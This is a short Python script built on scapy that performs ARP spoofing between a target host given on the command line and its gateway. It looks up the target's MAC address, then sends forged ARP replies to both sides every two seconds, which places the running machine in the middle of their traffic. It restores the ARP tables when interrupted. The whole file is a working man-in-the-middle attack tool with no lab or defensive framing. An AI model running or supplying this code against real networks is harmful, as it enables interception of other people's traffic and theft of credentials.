import scapy.all as scapy
import argparse
import time, sys


parser = argparse.ArgumentParser()
parser.add_argument("-ip", dest="ip", help="Please enter the IP you wish to use")
parser.add_argument("-g", dest="gateway", help="gateway")
args = parser.parse_args()


# Basic scan which is not hidden, will ping every computer.
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_brd = broadcast/arp_request
    ans = scapy.srp(arp_req_brd, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc


target_mac = get_mac(args.ip)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packet_count = 0
try:
    while True:
        packet_count += 2
        spoof(args.ip, args.gateway)
        spoof(args.gateway, args.ip)
        print("\r[+] Packets sent: " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("Ctrl-C has been pressed, cancelled script")
    restore(args.ip, args.gateway)
    restore(args.gateway, args.ip)
